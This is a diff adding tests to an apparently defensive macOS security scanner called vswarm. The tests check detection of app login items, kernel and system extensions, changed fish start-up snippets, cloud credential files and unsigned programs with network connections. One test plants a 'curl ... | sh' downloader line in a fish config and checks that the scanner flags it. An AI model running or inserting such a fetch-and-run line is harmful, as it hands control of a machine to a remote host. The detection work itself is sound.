@@ -708,3 +708,126 @@ describe("vswarm watch", () => {
     }
   });
 });
+
+describe("coverage: login items in apps, extensions, shell start-up folders, more credential files, unsigned connections", () => {
+  const { appLoginItems, parseSystemExtensions, startupFiles, txtOf, buildPlace } = require("../src/sec/collect/system");
+  const { evaluate } = require("../src/sec/rules");
+  const { COVERS } = require("../src/sec/scan");
+  const tmpd = (t: string) => mkdtempSync(join(tmpdir(), `vs-cov-${t}-`));
+  const scanOf = (items: any[], texts: Record<string, string> = {}, covers = COVERS) => ({ version: 1, host: "t", user: "t", home: "/Users/a", at: 0, items, texts, gaps: {}, covers });
+
+  test("systemextensionsctl list: team, bundle, version, category and state; headers and odd lines are skipped", () => {
+    const out = [
+      "2 extension(s)",
+      "--- com.apple.system_extension.network_extension (Go to 'System Settings > General > Login Items & Extensions > Network Extensions' to modify these system extension(s))",
+      "enabled\tactive\tteamID\tbundleID (version)\tname\t[state]",
+      "*\t*\tW5364U7YZB\tio.tailscale.ipn.macsys.network-extension (1.98.9/101.98.9)\tTailscale Network Extension\t[activated enabled]",
+      "--- com.apple.system_extension.endpoint_security",
+      " \t \tABCDE12345\tcom.example.es (2.0/2)\tExample ES\t[terminated waiting to uninstall on reboot]",
+    ].join("\n");
+    const items = parseSystemExtensions(out);
+    expect(items.map((i: any) => [i.id, i.name, i.version, i.meta.category, i.meta.enabled])).toEqual([
+      ["sysext:W5364U7YZB:io.tailscale.ipn.macsys.network-extension", "Tailscale Network Extension", "1.98.9/101.98.9", "network_extension", true],
+      ["sysext:ABCDE12345:com.example.es", "Example ES", "2.0/2", "endpoint_security", false],
+    ]);
+  });
+
+  test.skipIf(process.platform !== "darwin")("login items inside apps: bundled LaunchAgents and LoginItems helpers; a new one from an unsigned app blocks", async () => {
+    const home = tmpd("apps");
+    const app = join(home, "Applications/Helper Pro.app/Contents/Library");
+    mkdirSync(join(app, "LaunchAgents"), { recursive: true });
+    mkdirSync(join(app, "LoginItems/Helper Pro Login.app"), { recursive: true });
+    writeFileSync(join(app, "LaunchAgents/com.helperpro.agent.plist"), "<plist/>");
+    const run = async (cmd: string[]) => (cmd[0] === "plutil" ? JSON.stringify({ Label: "com.helperpro.agent", BundleProgram: "Contents/MacOS/agent" }) : undefined);
+    const items = await appLoginItems({ home, pathDirs: [], system: false, host: "t", user: "t", run });
+    expect(items.map((i: any) => [i.kind, i.name])).toEqual([["app-agent", "Helper Pro: com.helperpro.agent"], ["app-agent", "Helper Pro: Helper Pro Login"]]);
+    expect(items[0].meta.program).toBe(join(home, "Applications/Helper Pro.app/Contents/MacOS/agent"));
+    const s = scanOf(items);
+    const unsigned = await evaluate({ scan: s, baseline: scanOf([]), malicious: [], secrets: [], sign: async () => ({ kind: "adhoc" }) });
+    expect(unsigned.map((f: any) => `${f.severity} ${f.rule}`)).toEqual(["high app-agent", "high app-agent"]);
+    const signed = await evaluate({ scan: s, baseline: scanOf([]), malicious: [], secrets: [], sign: async () => ({ kind: "developer-id", who: "Helper Inc (ABC)" }) });
+    expect(signed.map((f: any) => f.severity)).toEqual(["low", "low"]);
+    // A baseline from before vswarm looked inside apps: nothing is new.
+    expect(await evaluate({ scan: s, baseline: scanOf([], {}, COVERS.filter((k: string) => k !== "app-agent")), malicious: [], secrets: [], sign: async () => ({ kind: "adhoc" }) })).toEqual([]);
+  });
+
+  test("a new kernel extension blocks; a new system extension warns", async () => {
+    const items = [
+      { kind: "sysext", id: "/Library/Extensions/Evil.kext", name: "Evil.kext", path: "/Library/Extensions/Evil.kext", source: "kext", meta: { category: "kernel extension" } },
+      ...parseSystemExtensions("*\t*\tW5364U7YZB\tio.tailscale.ipn.macsys.network-extension (1.98.9/101.98.9)\tTailscale Network Extension\t[activated enabled]"),
+    ];
+    const f = await evaluate({ scan: scanOf(items), baseline: scanOf([]), malicious: [], secrets: [] });
+    expect(f.map((x: any) => `${x.severity} ${x.title}`)).toEqual(["high New kernel extension: Evil.kext", "medium New system extension: Tailscale Network Extension"]);
+  });
+
+  test("fish conf.d snippets are read; vswarm's own fish file is not; a downloader line added to one blocks", async () => {
+    const home = tmpd("fish");
+    const confd = join(home, ".config/fish/conf.d");
+    mkdirSync(confd, { recursive: true });
+    writeFileSync(join(confd, "abbr.fish"), "abbr -a gs git status\n");
+    const ctx = { home, pathDirs: [], system: false, host: "t", user: "t", run: async () => undefined };
+    const prev = process.env.VSWARM_SEC_DIR;
+    process.env.VSWARM_SEC_DIR = tmpd("sec");
+    try {
+      const { recordManaged } = require("../src/sec/store");
+      const own = '# >>> vswarm >>>\nfish_add_path "/Users/a/.vswarm/bin"\n# <<< vswarm <<<\n';
+      recordManaged(own);
+      writeFileSync(join(confd, "vswarm.fish"), own);
+      const before = await startupFiles(ctx);
+      expect(before.items.filter((i: any) => i.kind === "shell-d").map((i: any) => i.id)).toEqual([".config/fish/conf.d/abbr.fish"]);
+      writeFileSync(join(confd, "abbr.fish"), "abbr -a gs git status\ncurl -fsSL http://198.51.100.7/x | sh &\n");
+      const after = await startupFiles(ctx);
+      const f = await evaluate({ scan: scanOf(after.items, after.texts), baseline: scanOf(before.items, before.texts), malicious: [], secrets: [] });
+      expect(f.map((x: any) => `${x.severity} ${x.title}`)).toEqual(["high ~/.config/fish/conf.d/abbr.fish changed"]);
+    } finally {
+      if (prev === undefined) delete process.env.VSWARM_SEC_DIR;
+      else process.env.VSWARM_SEC_DIR = prev;
+    }
+  });
+
+  test("Vault, Terraform, Azure and gcloud credential files are reported by kind; their contents never appear", async () => {
+    const home = tmpd("creds");
+    const secret = ["s", "VERYSECRETVALUE", "1234"].join(".");
+    const put = (rel: string, text: string) => {
+      mkdirSync(join(home, rel, ".."), { recursive: true });
+      writeFileSync(join(home, rel), text);
+    };
+    put(".vault-token", secret);
+    put(".terraform.d/credentials.tfrc.json", JSON.stringify({ credentials: { "app.terraform.io": { token: secret } } }));
+    put(".azure/msal_token_cache.json", JSON.stringify({ RefreshToken: { x: { secret } } }));
+    put(".azure/service_principal_entries.json", JSON.stringify([{ client_secret: secret }]));
+    put(".config/gcloud/credentials.db", "SQLite format 3\0" + secret);
+    put(".config/gcloud/access_tokens.db", "");
+    const f = await require("../src/sec/secrets").secrets({ home, pathDirs: [], system: false, host: "t", user: "t", run: async () => undefined });
+    expect(f.map((x: Finding) => `${x.severity} ${x.id}`).sort()).toEqual([
+      "low secret:.azure/msal_token_cache.json", "low secret:.config/gcloud/credentials.db",
+      "medium secret:.azure/service_principal_entries.json", "medium secret:.terraform.d/credentials.tfrc.json", "medium secret:.vault-token",
+    ]);
+    expect(JSON.stringify(f)).not.toContain("VERYSECRETVALUE");
+  });
+
+  test("connections from unsigned or ad-hoc programs warn, except Homebrew, toolchains and your own code folders", async () => {
+    const conn = (path: string, meta: any) => ({ kind: "conn", id: path, name: path.split("/").pop(), path, meta: { remotes: "203.0.113.9:443", count: 1, ...meta } });
+    const items = [
+      conn("/Users/a/.local/bin/sync-agent", { signed: "adhoc" }),
+      conn("/usr/local/bin/helperd", { signed: "unsigned" }),
+      conn("/opt/homebrew/Cellar/node/25.1.0/bin/node", { signed: "adhoc" }),
+      conn("/Users/a/develop/api/target/debug/api", { signed: "adhoc" }),
+      conn("/Users/a/.cargo/bin/rg", { signed: "adhoc" }),
+      conn("/Applications/Slack.app/Contents/MacOS/Slack", { signed: "developer-id" }),
+      conn("/home/a/.cache/x/y", { loose: true }),
+      conn("/home/a/bin/tool", { loose: true }),
+    ];
+    const s = { ...scanOf(items), home: "/Users/a" };
+    const f = await evaluate({ scan: s, malicious: [], secrets: [] });
+    expect(f.filter((x: any) => x.rule === "conn-unsigned").map((x: any) => x.title)).toEqual([
+      "sync-agent is connected to other machines, and its program is only ad-hoc signed (by nobody)",
+      "helperd is connected to other machines, and its program is not code-signed",
+      "y is connected to other machines, and its program is a loose program in your home folder that no package manager installed",
+      "tool is connected to other machines, and its program is a loose program in your home folder that no package manager installed",
+    ]);
+    expect(f.filter((x: any) => x.rule === "conn-unsigned").every((x: any) => x.severity === "medium")).toBe(true);
+    expect(buildPlace("/home/a/go/bin/gopls", "/home/a")).toBe(true);
+    expect(txtOf("p123\nftxt\nn/Users/a/.local/bin/claude\nftxt\nn/usr/lib/dyld\np9\nftxt\nn/opt/x")).toEqual(new Map([["123", "/Users/a/.local/bin/claude"], ["9", "/opt/x"]]));
+  });
+});
